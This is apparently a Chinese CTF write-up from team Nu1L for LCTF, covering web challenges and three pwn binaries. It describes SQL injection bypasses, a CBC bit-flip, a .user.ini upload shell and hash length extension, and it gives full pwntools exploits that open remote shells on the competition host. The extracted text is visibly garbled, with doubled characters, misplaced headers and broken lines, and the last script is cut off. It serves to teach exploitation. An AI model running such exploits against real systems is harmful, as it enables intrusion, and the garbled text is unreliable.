过滤了了相关字符，and,select,updatexml双写绕过就好，空格⽤用/**/代替，拿到密
码 we1c0me%_#2&_@LCTF 。进去之后发现任意提交passwd提示密码不不对，让
num=0，passwd=5487即可。
虽然说写了了waf，但是sqlmap照样能过XD。各种tamper加上就好了了：
​
题⽬目⼀一共分为三步
第⼀一步是⼀一个正则绕过：
题⽬目的正则应该是php://.resource=(.)$这种形式，⽽而且第⼀一步应该先会检测是否是图⽚片，于双次
绕过就好了了:
Nu1L LCTF writeup 
Web 
签到题 
我控⼏几不不主我及⼏几啦 
苏达学姐的⽹网站 
​
再读⼀一下ﬁle/admin.php.txt：
​
熟悉的CBC字节翻转攻击：
​
拿到cookie之后，登录进去发现是⼀一个上传⻚页⾯面，测试后发现可以上传ini⽂文件，
于是通过上传.user.ini⽂文件，getshell，菜⼑刀连上发现ﬂag：
​
前⼏几天刚爆出来的漏漏洞洞，关于magic函数wakeup在反序列列化数据时，如果属性过
多导致wakup失效，具体⽂文章可以⾃自⼰己找下。利利⽤用+号以及修改属性值绕过，最
后利利⽤用glob绕过open_basedir，在/var/www/ﬂag⽬目录下发现ﬂag：
​
睡过了了 
感觉学到很多的⼀一个题⽬目：
⾸首先是⼆二次盲注，我们发现随意注册⼀一个⽤用户进⼊入之后会有修改⽤用户头像的地
⽅方，⽽而主办⽅方放的提示是⼆二次注⼊入，猜测修改头像时，会把⽤用户名带⼊入查询，如
果查询错误，头像返回就是空，如果不不是，则头像返回就会有⻓长度，于是利利⽤用
mid函数就可以了了，py⼩小脚本上⼀一发：
​
得到⽤用户密码：1d5afc15d99fe43fb602b25f3b5d2ee0
Cmd5解密是1admin2016
然后fuzz下⽬目录，发现有admin.php以及robots.txt，⽤用户更更换图⽚片地⽅方存在
ssrf（但是没什什么⽤用?不不过能看源码）：
主办⽅方提示了了⽐比较函数，⽽而直接admin账户登录是显示账户错误的，于是user[]数
组绕过即可，最后拿到ﬂag：
​
⽐比较好玩的⼀一个题⽬目，虽然最后看运⽓气，⾸首先fuzz下⽬目录，发现：
​
然后访问下：
​
headpic 
你⼀一定不不能来这 
下载下download.php:
​
Hash⻓长度扩展攻击，利利⽤用py下的hashpumpy爆破下secert的⻓长度就可以了了：
​
得到⻓长度是18：
​
然后下载www.rar，发现有密码QAQ，hex编辑器器打开在最后发现jjencode代码，
github上有解密的脚本：
​
YoU CAN gET Some INterESted Thing If You CAN deCOde Me In tImE.
培根密码：XXDDCCTTFF
拿到源码之后，没有什什么逻辑，就是爆破time时间戳与rand随机数1-10000结合
之后的md5：
​
于是burp或者⾃自⼰己写多线程脚本跑就好了了：
​
要注意，抓包获得的时间并不不是东⼋八区北北京时间，所以需要加8才能算对，感谢
主办⽅方后期⼼心疼我们改了了时间，要不不然根本出不不来= =
很明显的栈溢出，然后就是构造ROP，泄露露libc地址，调⽤用system(“/bin/sh”)
from pwn import *
DEBUG = 0
if DEBUG:
    context.log_level = 'debug'
    io = process('./pwn100')
Pwn 
Pwn100 
    gdb.attach(io)
else:
    io = remote('119.28.63.211', 2332)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./pwn100')
puts_got_addr = elf.got['puts']
read_got_addr = elf.got['read']
puts_plt_addr = elf.symbols['puts']
read_plt_addr = elf.symbols['read']
pop_rdi_ret_addr = 0x0000000000400763
pop_rsi_pop_r15_ret_addr = 0x0000000000400761
pop_pop_pop_pop_ret_addr = 0x000000000040075d
rsp = 0x00601300
payload = 'A' * 0x40 + 'B' * 0x8 + p64(pop_rdi_ret_addr) + p64(
puts_got_addr) + p64(puts_plt_addr)
payload += p64(pop_rdi_ret_addr) + p64(read_got_addr) + p64(put
s_plt_addr)
payload += p64(pop_rdi_ret_addr) + p64(0) + p64(pop_rsi_pop_r15
_ret_addr) + p64(rsp) + p64(1) + p64(read_plt_addr)
payload += p64(pop_pop_pop_pop_ret_addr) + p64(rsp)
payload = payload.ljust(0xC8, 'A')
raw_input('go?')
io.send(payload)
io.recvline()
libc_puts_addr = u64(io.recvline()[:6] + '\x00\x00')
libc_read_addr = u64(io.recvline()[:6] + '\x00\x00')
libc_base_addr = libc_puts_addr - 0x00070c70
libc_system_addr = libc_base_addr + 0x000468f0
bin_sh_addr = libc_base_addr + 0x0017dbc5
# libc_system_addr = libc_puts_addr - (libc.symbols['puts'] - l
ibc.symbols['system'])
# bin_sh_addr = libc_puts_addr - (libc.symbols['puts'] - next(l
ibc.search('/bin/sh')))
log.info('libc_puts_addr:%s' % hex(libc_puts_addr))
log.info('libc_read_addr:%s' % hex(libc_read_addr))
payload2 = p64(1) * 3
payload2 += p64(pop_rdi_ret_addr) + p64(bin_sh_addr) + p64(libc
_system_addr)
io.sendline(payload2)
io.interactive()
Pwn200 
⾸首先IDA静态分析，400A8E函数存在⼀一个栈地址泄漏漏
​
继续分析程序流程，在4007DF处发现输⼊入的ID第⼀一位为0时直接结束该函数执⾏行行
然后去执⾏行行400A29，该函数中有strcpy存在很明显的栈溢出。
​
⼜又因40096D中调⽤用free，所以直接将shellcode起始地址覆盖free_plt，调⽤用free
时直接开sh:
​
#!/usr/bin/env python
from pwn import *
DEBUG = 0
if DEBUG:
    p = process('./pwn2003sw54ed65rf7t')
else:
    p = remote('119.28.63.211', 2333)
#pwntools shellcraft
shellcode = asm(shellcraft.amd64.linux.sh(), arch = 'amd64')
#some address
free_plt = 0x0000000000602018
def pwn():
    p.recvuntil('who are u?\n')
    p.send(shellcode.ljust(48))
    p.recvuntil(shellcode.ljust(48))
    leak_addr = u64(p.recvn(6).ljust(8, '\x00'))
    shellcode_addr = leak_addr - 0x50
    print 'shellcode addr: ' + hex(shellcode_addr)
    p.recvuntil('give me your id ~~?\n')
    p.sendline('0')
    p.recvuntil('give me money~\n')
    payload = p64(shellcode_addr).ljust(56, '\x00') + p64(free_
plt)
    p.send(payload)
    p.sendline('2')
    p.interactive()
if __name__ == '__main__':
    pwn()
​
拿到程序运⾏行行发现缺少lib，readelf看⼀一下发现程序需要两个特殊的库: libio和
libgetshell，⽤用ida分析可以很轻松找到栈溢出，利利⽤用栈溢出将libgetshell dump下
来看到⼀一个名为getshell的函数，跳到那⾥里里就可以拿shell。
脚本：
#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
from ctypes import *
from hexdump import hexdump
import os, sys
# switches
DEBUG = 0
LOCAL = 0
VERBOSE = 1
# modify this
if LOCAL:
    io = process('./pwn300kh6y5gt3treg')
else:
    io = remote('119.28.63.211',2339)
if VERBOSE: context(log_level='debug')
# define symbols and offsets here
# simplified r/s function
def ru(delim):
    return io.recvuntil(delim)
Pwn300 
def rn(count):
    return io.recvn(count)
def ra(count):      # recv all
    buf = ''
    while count:
        tmp = io.recvn(count)
        buf += tmp
        count -= len(tmp)
    return buf
def sl(data):
    return io.sendline(data)
def sn(data):
    return io.send(data)
def info(string):
    return log.info(string)
def dehex(s):
    return s.replace(' ','').decode('hex')
def limu8(x):
    return c_uint8(x).value
def limu16(x):
    return c_uint16(x).value
def limu32(x):
    return c_uint32(x).value
# define interactive functions here
def recursive():
    for i in xrange(10):
        ru('fuck me!\n')
        payload = 40 * 'a' + p64(0x4004a9)
        sn(payload.ljust(0xa0))
    return
def leak(addr, length=40):
    ru('fuck me!\n')
    pad = 40 * 'A'
    pop6 = 0x40049e
    callframe = 0x400484
    write_got = 0x601018
    payload = pad + p64(pop6) + p64(write_got) + p64(length) + 
p64(addr) + p64(1) + p64(callframe) + p64(0) * 7 + p64(0x4004A9
)
    print len(payload)
    assert len(payload) <= 0xa0
    sn(payload.ljust(0xa0))
    return ra(length)
# define exploit function here
def pwn():
    if DEBUG: gdb.attach(io)